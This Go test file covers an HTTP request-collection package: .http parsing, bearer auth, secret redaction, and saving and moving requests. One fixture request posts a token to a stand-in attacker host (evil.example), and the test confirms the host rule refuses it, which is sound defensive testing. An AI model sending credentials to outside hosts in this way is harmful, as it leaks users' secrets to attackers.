package requests

import (
	"context"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// TestSendGuardsKeys covers parsing, the environment's auth, filling in values, the host rule,
// redaction, and saving and moving a request.
func TestSendGuardsKeys(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte(`{"echo":"` + r.Header.Get("Authorization") + `","access_token":"fresh-one","id":7}`))
	}))
	defer srv.Close()
	reqs := Parse("accounts/a.http", "### Me\n# a comment\nGET {{baseUrl}}/me\n\n### Other\n# @auth none\nPOST https://evil.example/x?t={{token}}\n")
	if len(reqs) != 2 || reqs[0].Name != "Me" || reqs[0].App != "accounts" || !reqs[1].NoAuth {
		t.Fatalf("parse: %+v", reqs)
	}
	env := Env{App: "accounts", Name: "dev", Vars: map[string]string{"baseUrl": srv.URL}, Keys: []string{"token"}, Auth: Auth{Kind: "bearer", Key: "token"}}
	keys := map[string]string{"token": "s3cr3t-value"}
	res, err := Send(context.Background(), reqs[0], env, keys)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(res.Body), "Bearer s3cr3t-value") {
		t.Fatalf("auth not added: %s", res.Body)
	}
	out := Format(res, keys, true)
	if strings.Contains(out, "s3cr3t-value") || strings.Contains(out, "fresh-one") || !strings.Contains(out, `"id": 7`) {
		t.Fatalf("not redacted:\n%s", out)
	}
	if _, err := Send(context.Background(), reqs[1], env, keys); err == nil || !strings.Contains(err.Error(), "refused") {
		t.Fatalf("key sent to another host: %v", err)
	}
	dir := t.TempDir()
	saved, err := Save(dir, Request{App: "accounts", Name: "List orgs", Method: "GET", URL: "{{baseUrl}}/orgs", Tags: SplitTags("Orgs, smoke,orgs")})
	if err != nil || saved.File != "accounts/list-orgs.http" {
		t.Fatalf("save: %v %+v", err, saved)
	}
	if all, _ := Load(dir); len(all) != 1 || all[0].Path() != "/orgs" || strings.Join(all[0].Tags, ",") != "orgs,smoke" {
		t.Fatalf("load: %+v", all)
	}
	moved, err := Move(dir, saved, "orgs")
	if all, _ := Load(dir); err != nil || moved.File != "accounts/orgs/list-orgs.http" || len(all) != 1 || all[0].Folder != "orgs" {
		t.Fatalf("move: %v %+v %+v", err, moved, all)
	}
}
